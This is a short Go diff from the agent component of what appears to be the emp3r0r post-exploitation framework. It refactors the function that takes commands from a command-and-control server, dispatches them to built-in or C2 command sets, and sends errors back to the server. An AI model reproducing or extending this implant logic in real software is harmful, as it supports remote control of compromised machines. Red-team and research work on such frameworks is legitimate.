@@ -2,22 +2,31 @@ package agent
 
 import (
 	"log"
+	"strings"
 
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/spf13/cobra"
 )
 
-// exec cmd, receive data, etc
-func processCCData(data *emp3r0r_def.MsgTunData) {
-	cmd_id := data.CmdID
-	cmd_argc := len(data.CmdSlice)
-	cmdSlice := append(data.CmdSlice, []string{"--cmd_id", cmd_id}...)
+// exec cmd from C2 server
+func handleC2Command(cmdData *emp3r0r_def.MsgTunData) {
+	cmd_id := cmdData.CmdID
+	cmd_argc := len(cmdData.CmdSlice)
+	cmdSlice := append(cmdData.CmdSlice, []string{"--cmd_id", cmd_id}...)
 	if cmd_argc < 0 {
 		log.Printf("Invalid command: %v", cmdSlice)
 	}
-	agentCommand := AgentCommands()
-	agentCommand.SetArgs(cmdSlice)
-	agentCommand.Execute()
+	command := CoreCommands()
+	is_builtin := strings.HasPrefix(cmdSlice[0], "!")
+	if is_builtin {
+		command = C2Commands()
+	}
+	command.SetArgs(cmdSlice)
+	command.SetOutput(log.Writer())
+	err := command.Execute()
+	if err != nil {
+		SendCmdRespToC2(err.Error(), command, cmdSlice)
+	}
 }
 
 // send response to C2 server
